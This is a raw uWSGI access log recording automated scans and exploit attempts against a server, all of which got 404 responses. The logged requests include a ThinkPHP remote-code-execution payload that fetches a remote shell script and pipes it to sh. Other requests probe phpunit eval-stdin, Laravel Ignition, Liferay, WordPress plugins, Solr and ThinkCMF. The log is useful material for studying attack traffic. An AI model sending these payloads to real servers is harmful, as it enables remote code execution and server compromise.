[1615219201] ./uwsgi.log reopened.
[pid: 233991|app: 0|req: 793/4734] 222.128.60.145 () {36 vars in 530 bytes} [Tue Mar  9 00:59:35 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233990|app: 0|req: 778/4735] 222.128.60.145 () {36 vars in 833 bytes} [Tue Mar  9 00:59:35 2021] GET /?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl+--user-agent+curl_tp5+http://194.40.243.98/ldr.sh|sh => generated 179 bytes in 2 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 2150/4736] 45.155.205.225 () {38 vars in 714 bytes} [Tue Mar  9 01:42:41 2021] POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233989|app: 0|req: 1016/4737] 45.155.205.225 () {38 vars in 612 bytes} [Tue Mar  9 01:42:42 2021] POST /api/jsonws/invoke => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233990|app: 0|req: 779/4738] 45.155.205.225 () {34 vars in 558 bytes} [Tue Mar  9 01:42:42 2021] GET /?XDEBUG_SESSION_START=phpstorm => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233991|app: 0|req: 794/4739] 45.155.205.225 () {36 vars in 626 bytes} [Tue Mar  9 01:42:42 2021] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233991|app: 0|req: 795/4740] 45.155.205.225 () {34 vars in 589 bytes} [Tue Mar  9 01:42:43 2021] GET /wp-content/plugins/wp-file-manager/readme.txt => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233990|app: 0|req: 780/4741] 45.155.205.225 () {34 vars in 722 bytes} [Tue Mar  9 01:42:43 2021] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233990|app: 0|req: 781/4742] 45.155.205.225 () {34 vars in 558 bytes} [Tue Mar  9 01:42:43 2021] GET /solr/admin/info/system?wt=json => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233989|app: 0|req: 1017/4743] 45.155.205.225 () {38 vars in 638 bytes} [Tue Mar  9 01:42:43 2021] POST /Autodiscover/Autodiscover.xml => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233989|app: 0|req: 1018/4744] 45.155.205.225 () {36 vars in 604 bytes} [Tue Mar  9 01:42:44 2021] GET /_ignition/execute-solution => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233991|app: 0|req: 796/4745] 45.155.205.225 () {34 vars in 515 bytes} [Tue Mar  9 01:42:44 2021] GET /console/ => generated 179 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233990|app: 0|req: 782/4746] 45.155.205.225 () {36 vars in 655 bytes} [Tue Mar  9 01:42:44 2021] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 2151/4747] 74.82.47.2 () {28 vars in 306 bytes} [Tue Mar  9 01:56:06 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 2152/4748] 192.241.224.227 () {34 vars in 397 bytes} [Tue Mar  9 01:59:12 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 2153/4749] 123.49.38.142 () {34 vars in 453 bytes} [Tue Mar  9 02:45:28 2021] GET /manager/html => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233991|app: 0|req: 797/4750] 123.49.38.142 () {36 vars in 553 bytes} [Tue Mar  9 02:45:29 2021] GET /wp-login.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233989|app: 0|req: 1019/4751] 123.49.38.142 () {36 vars in 529 bytes} [Tue Mar  9 02:45:29 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
